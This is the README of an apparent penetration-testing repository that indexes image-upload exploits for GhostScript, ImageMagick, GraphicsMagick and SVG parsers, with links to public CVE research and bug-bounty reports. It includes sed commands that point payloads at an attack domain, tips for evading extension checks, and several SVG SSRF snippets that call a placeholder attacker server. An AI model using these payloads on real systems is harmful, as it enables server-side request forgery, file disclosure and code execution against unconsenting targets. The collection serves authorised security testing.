## Image Upload Exploits

This repository contains various old image exploits (2016 - 2019) for known vulnerabilities in image processors. This is a compilation of various files/attack vectors/exploits that I use in penetration testing and bug bounty.

Also, you can find some tips, examples, and links to other tools useful for attacks in the related section. 

**Nothing new. The repository is based on third-party research, BugBounty disclosures, and own experience. All the links to original publications are attached to relevant sections.**

If you have more exploits please make a pull request!

Every DNS-based and SSRF exploits have an abstract scheme, hostname, port for resolve, just use these commands to replace all of them. Exploits also have a subdomain (like **ssrf-svg-image-href.evil.com**) that indicates which bug was triggered.

Replace hostname (for DNS-based and SSRF payloads):
```
grep -rl 'TARGET_DOMAIN' * | xargs -i@ sed -i 's/TARGET_DOMAIN/your.attack.domain/g' @
```

Replace scheme (for SSRF payloads):
```
grep -rl 'TARGET_SCHEME://' * | xargs -i@ sed -i 's/TARGET_SCHEME:\/\//http:\/\//g' @
```

Replace port (for SSRF payloads):
```
grep -rl 'TARGET_PORT' * | xargs -i@ sed -i 's/TARGET_PORT/80/g' @
```

#### General Tips

1. If the target extension is disallowed on the web server - try to change it to allowed extension PNG/JPG/GIF or allowed MIME type. Some image processors recognize the image format by its content. (Most files in this repo have duplicate with .jpg extension)
2. Use default SSRF tricks - try to change protocol (e.g. `ftp://`, `https://`, `file://` or UNC '\\\\your-domain\\share'), port (e.g. 53,22,443)
3. Create an HTML page on your web server with malicious images and malicious `favicon.ico`, some crawlers/web uploaders may render HTML to some kind of preview, and images will be processed and rendered too.

### Cheatsheet

* [DoS Attacks](DoS/)
* [GhostScript](GhostScript/)
* [MemoryLeaks](MemoryLeaks/)
* [SVG](SVG/)

### DoS 

#### Pixel Flood
[lottapixel.jpg](DoS/lottapixel.jpg)

Just a typical data compression bomb. When loaded to memory, it will be unpacked as 4128062500 pixels. Be careful!

Links:
* [beurtschipper, HackerOne BugBounty](https://hackerone.com/reports/390)

#### zTXt chunk
[txt.png](DoS/txt.png)

Yet another data compression bomb, the exploit uses the special zTXt chunk with zlib compression. Be careful!

Links:
* [beurtschipper, HackerOne BugBounty](https://hackerone.com/reports/454)

### GhostScript

GhostScript is an interpreter for PostScript. PostScript is a type of programming language, and most exploits affect sandboxing in PostScript. Vulnerabilities in GhostScript affect ImageMagick because it uses GhostScript for processing PostScript files like a **PDF**, **EPS**, **PS**, **XPS**. For sure, if you found an application that handles these file types without ImageMagick, you can also try these exploits.

**Exploits**

Few various versions with DNS-based and timeout-based payloads, and different extensions:

* [Exploits for CVE-2017–8291](GhostScript/CVE-2017-8291)
* [Exploits for CVE-2018-16509](GhostScript/CVE-2018-16509)
* [Exploits for CVE-2019-6116](GhostScript/CVE-2019-6116)
* [Exploits for CVE-2019-14811, CVE-2019-14812, CVE-2019-14813](GhostScript/CVE-2019-1481X)
* [Exploits for CVE-2019-10216](GhostScript/CVE-2019-10216)

**Links**

* [Franz Rosen, Semrush BugBounty](https://hackerone.com/reports/403417)
* [chaosbolt, pixiv BugBounty](https://hackerone.com/reports/402362)
* [Original repo by @hhc0null](https://github.com/hhc0null/GhostRule)

### MemoryLeaks

#### Gifoeb (CVE-2017-15277)

Memory leak due to error processing GIF images in ImageMagick. This bug was discovered by [Emil Lerner](https://github.com/neex). He also created a [PoC](https://github.com/neex/gifoeb) that allows you to extract data from the resulting image. This vulnerability is often found in applications that allow you to upload images and then process them, for example, resize. The size of memory leakage is limited to 768 bytes.

You can use [300x300 GIF image](MemoryLeaks/GIF_CVE-2017-15277/300x300.gif) file to detect if an application is vulnerable. If vulnerable you will see something like:

![](MemoryLeaks/GIF_CVE-2017-15277/result1.jpg)

then use Emil's [PoC](https://github.com/neex/gifoeb) to extract memory bytes.

**Links**

* [Original PoC](https://github.com/neex/gifoeb)
* [Eray Mitrani, Twitter BugBounty](https://hackerone.com/reports/315906)

#### XBM memory leak (CVE-2018-16323)

Memory leak due to error processing XBM images in ImageMagick. Same conditions as in CVE-2017-15277, when web application processes image using ImageMagick, for example, resize. The vulnerability was discovered by [Fedotkin Zakhar](https://github.com/d0ge), who created [PoC](https://github.com/d0ge/xbmdump). The size of memory leakage is unlimited but environment-dependent.

**Exploits**

* [Valid 500x500 XBM image](MemoryLeaks/XBM_CVE-2018-16323/poc-500.xbm)
* [Same as above with JPG extension](MemoryLeaks/XBM_CVE-2018-16323/poc-500.jpg)
* [500x500 image with short payload](MemoryLeaks/XBM_CVE-2018-16323/poc-min.xbm)
* [Same as above with JPG extension](MemoryLeaks/XBM_CVE-2018-16323/poc-min.jpg)

If the web application is vulnerable, then the result will be similar to something like:

![](MemoryLeaks/XBM_CVE-2018-16323/result1.png)

Then try to recover raw bytes using PoC. Or simply use ImageMagick:
```
convert result1.png result1.xbm
```
In `result1.xbm` you will see raw bytes of memory as part of an array in the XBM image.

**Links**

* [Original PoC by @d0ge](https://github.com/d0ge/xbmdump)
* [How it works](https://medium.com/@ilja.bv/yet-another-memory-leak-in-imagemagick-or-how-to-exploit-cve-2018-16323-a60f048a1e12)
* [Alternative PoC by @ttffdd](https://github.com/ttffdd/XBadManners)

### SVG

This pretty image format is a vector-based image defined in XML. 

#### SVG Basics

1. In SVG you can define links to external resources, so this can lead to SSRF attack or local file read. 
2. SVG can contain JavaScript code and if content-type in HTTP Response is image/svg+xml JS will be executed. 
3. XML? XXE!
4. If SVG image is rendered to some raster image format (e.g. PNG, JPG, .., etc) then 1 and 3 can lead to interesting results, you can render some text files or images in the resulting image.

**Exploits**

* [SSRF payloads](SVG/SSRF/)
* [XXE payloads](SVG/XXE/)
* [XSS payloads](SVG/XSS/)

**Some native examples**

External image
```
<image height="100" width="100" xlink:href="http://YOUR-SERVER.COM:80/" />
```
```
<feImage xlink:href="http://YOUR-SERVER.COM:80/" width="200" height="200"/>
```

External stylesheet
```
<?xml-stylesheet type="text/css" href="http://YOUR-SERVER.COM:80"?>
```
```
<style>
   @import url(http://YOUR-SERVER.COM:80/);
</style>
```

External fill source. [From HackerOne](https://hackerone.com/reports/347139) 
```
<rect fill="url(http://YOUR-SERVER.COM:80)">
```

Iframe
If iframe is rendered then you can try to read files or make arbitrary requests
```
<foreignObject width="100" height="100">
    <iframe src="http://YOUR-SERVER.COM:80"></iframe>
</foreignObject>
```

External CSS
```
  <style>
    @import url(http://YOUR-SERVER.COM:80/);
  </style>
```

[SVG tags that include xlink:href attribute](https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/xlink:href)

**Links**

* [SSRF via xlink SVG, fingerprinting libraries](
https://medium.com/@arbazhussain/svg-xlink-ssrf-fingerprinting-libraries-version-450ebecc2f3c)
* [SVGSalamander CVE-2017-5617, Java library for SVG handling](https://github.com/blackears/svgSalamander/issues/11)
* [Another collection of SVG SSRF payloads](
https://github.com/cujanovic/SSRF-Testing/tree/master/svg)
* [XSS via SVG, Abdullah Hussam Paragon Initiative Enterprises BugBounty](https://hackerone.com/reports/148853)
* [SSRF via xlink, floyd Shopify BugBounty](https://hackerone.com/reports/223203)
* [SSRF via fill, Alex Birsan Rockstar Games BugBounty](https://hackerone.com/reports/265050)

#### ImageTragick (CVE-2016–3714, CVE-2016-3718, CVE-2016-3715, CVE-2016-3716, CVE-2016-3717)

The most famous bugs in ImageMagick. Vulnerabilities were found by [Stewie](https://hackerone.com/stewie) and [Nikolay Ermishkin ](https://twitter.com/__sl1m). It includes RCE, SSRF, File deletion, File moving, and Local file read.

* [Exploits](SVG/ImageTragick_CVE-2016-3714) – DNS resolve and sleep for timebased checks 

**Links**

* [Original Source](https://imagetragick.com/)
* [Andrey Leonov, Facebook BugBounty](https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html)

#### GraphicsMagick File Read CVE-2019-12921

The vulnerability in the GraphicsMagick library was found by [Fedotkin Zakhar](https://github.com/d0ge). The bug can be exploited for arbitrary file reading, if an SVG image is rendered then the text file will be rendered in the resulting image too. For exploitation you need to specify the path to some image, it can be a remote path. In case if a remote image is unavailable from the target server you can also check the default images on the target system and use the local path to some image in the exploit.

* [Exploits](SVG/GraphicsMagick_CVE-2019-12921/)

**Links**

* [Original description by Fedotkin Zakhar](https://github.com/d0ge/data-processing/blob/master/CVE-2019-12921.md)

#### Shell Injection in ImageMagick CVE-2020-29599

The ImageMagick vulnerability in processing passwords for PDF, however, it is highly likely you will never find this bug, as only a few minor ImageMagick versions are vulnerable.

```
First of all the SVG structure has an image root tag. As the parser does not enforce that the SVG tag is the root tag, IM has no problems parsing this file as an SVG. The SVG structure specifies an image URL, which uses msl:poc.svg. This tells ImageMagick to load poc.svg with the MSL coder. 

Although MSF is an XML-based structure, the MSF coder does not deploy a real XML parser. It only requires that the file starts with a tag it supports. Another trick I used is present in the read tag. It is necessary to target a PDF file to trigger the vulnerability. To bypass this necessity, I specified any known local file and used the pdf: protocol handler to ensure it is treated as a PDF.
````

* [Exploits](SVG/Shell_Injection_CVE-2020-29599) – DNS resolve and sleep for time-based checks 

**Links**
* [Original publication by Alex Inführ](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)

